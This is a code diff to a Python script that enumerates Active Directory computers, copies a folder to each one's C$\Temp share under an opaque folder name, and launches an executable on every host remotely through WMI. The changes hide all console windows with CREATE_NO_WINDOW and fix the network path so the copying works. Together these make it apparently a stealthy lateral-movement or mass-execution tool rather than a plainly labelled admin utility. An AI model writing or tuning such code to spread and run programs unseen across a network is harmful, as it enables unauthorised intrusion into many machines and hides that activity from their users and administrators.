@@ -28,7 +28,7 @@ def main():
                 """
             result = subprocess.run(
                 ["powershell", "-Command", ps_command],
-                capture_output=True, text=True, check=True
+                capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
             )
             machines = result.stdout.strip().split('\n')
             return [machine for machine in machines if machine]
@@ -41,7 +41,8 @@ def main():
                 result = subprocess.run(
                     ["robocopy", source, destination, "/e", "/xo", "/xn", "/xc", "/XD", "__pycache__"],
                     capture_output=True,
-                    text=True
+                    text=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW
                 )
                 if result.returncode <= 7:
                     return True
@@ -52,19 +53,20 @@ def main():
 
     def transfer_and_execute(machine):
         try:
-            destination = f"\\{machine}\\C$\\Temp\\05ft8_2lthb4"
+            destination = f"\\\\{machine}\\C$\\Temp\\05ft8_2lthb4"
             if not retry_copy(FOLDER_PATH, destination):
                 return
             execute_command = [
                 "powershell", "-Command",
                 f"Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName {machine} -ArgumentList '{EXECUTABLE_PATH}'"
             ]
-            subprocess.run(execute_command, capture_output=True, text=True, check=True)
+            subprocess.run(execute_command, capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
         except subprocess.CalledProcessError as e:
             raise e
 
     machines = get_ad_machines()
     if not machines:
+        print("Failure")
         return
     
     for machine in machines:
